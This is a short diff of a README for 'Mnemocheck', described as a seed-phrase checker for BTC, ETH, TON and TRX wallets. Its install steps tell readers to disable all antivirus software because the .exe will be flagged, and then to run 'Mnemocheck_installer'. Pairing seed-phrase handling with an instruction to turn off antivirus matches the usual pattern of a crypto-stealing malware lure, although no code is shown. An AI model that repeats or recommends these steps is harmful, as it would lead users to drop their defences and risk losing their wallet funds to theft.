@@ -4,6 +4,7 @@ Seed (Mnemonic) phrases checker, BTC, ETH, TON, TRX....
 
 ### How to install:
 **`1)` Disabling all antiviruses, as this is an .exe file and your computer will treat it as an unidentified object.**
+
 **`2)` Click on the `Mnemocheck_installer` and install the program.**
 
 ___________________________________________________________________________________________________________
